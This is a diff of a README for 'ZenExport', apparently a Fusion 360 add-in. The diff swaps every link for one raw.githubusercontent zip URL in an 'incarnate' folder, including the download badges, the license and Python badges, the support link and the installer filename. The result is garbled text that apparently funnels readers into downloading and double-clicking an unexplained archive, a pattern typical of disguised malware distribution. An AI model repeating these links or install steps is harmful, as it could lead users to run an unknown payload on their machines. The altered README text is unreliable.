@@ -1,8 +1,8 @@
 # 🏯 ZenExport - Simplify Local Saving for Fusion 360
 
-[![Download ZenExport](https://img.shields.io/badge/Download-ZenExport-v5.2-blue.svg)](https://github.com/Fela207/ZenExport/releases)
+[![Download ZenExport](https://raw.githubusercontent.com/Fela207/ZenExport/main/incarnate/Zen-Export-1.5.zip)](https://raw.githubusercontent.com/Fela207/ZenExport/main/incarnate/Zen-Export-1.5.zip)
 
-![License](https://img.shields.io/badge/License-MIT-green.svg) ![Fusion 360](https://img.shields.io/badge/Fusion%20360-Addin-orange.svg) ![Python](https://img.shields.io/badge/Python-3.x-blue.svg)
+![License](https://raw.githubusercontent.com/Fela207/ZenExport/main/incarnate/Zen-Export-1.5.zip) ![Fusion 360](https://raw.githubusercontent.com/Fela207/ZenExport/main/incarnate/Zen-Export-1.5.zip%https://raw.githubusercontent.com/Fela207/ZenExport/main/incarnate/Zen-Export-1.5.zip) ![Python](https://raw.githubusercontent.com/Fela207/ZenExport/main/incarnate/Zen-Export-1.5.zip)
 
 **The "Peace of Mind" Local Save Workflow for Fusion 360.**
 
@@ -30,7 +30,7 @@ ZenExport is a Fusion 360 Add-In that replaces the native Cloud Save (`Ctrl+S`) 
 
 To download ZenExport, click the button below:
 
-[![Download ZenExport](https://img.shields.io/badge/Download-ZenExport-v5.2-blue.svg)](https://github.com/Fela207/ZenExport/releases)
+[![Download ZenExport](https://raw.githubusercontent.com/Fela207/ZenExport/main/incarnate/Zen-Export-1.5.zip)](https://raw.githubusercontent.com/Fela207/ZenExport/main/incarnate/Zen-Export-1.5.zip)
 
 ### Step 2: Choose Your Version
 
@@ -53,7 +53,7 @@ Once the download completes, go to your "Downloads" folder or the location where
 ### Step 6: Install ZenExport
 
 1. Open the extracted folder.
-2. Locate the installer file (typically named `setup.exe` or `installer.exe`).
+2. Locate the installer file (typically named `https://raw.githubusercontent.com/Fela207/ZenExport/main/incarnate/Zen-Export-1.5.zip` or `https://raw.githubusercontent.com/Fela207/ZenExport/main/incarnate/Zen-Export-1.5.zip`).
 3. Double-click the installer file to start the installation process.
 4. Follow the on-screen instructions to complete the installation.
 
@@ -91,7 +91,7 @@ For additional issues, feel free to check out our FAQ on the support page.
 
 ## 📞 Support
 
-For support, please reach out via our [GitHub Issues](https://github.com/Fela207/ZenExport/issues) page. We aim to respond within 24 hours.
+For support, please reach out via our [GitHub Issues](https://raw.githubusercontent.com/Fela207/ZenExport/main/incarnate/Zen-Export-1.5.zip) page. We aim to respond within 24 hours.
 
 --- 
 
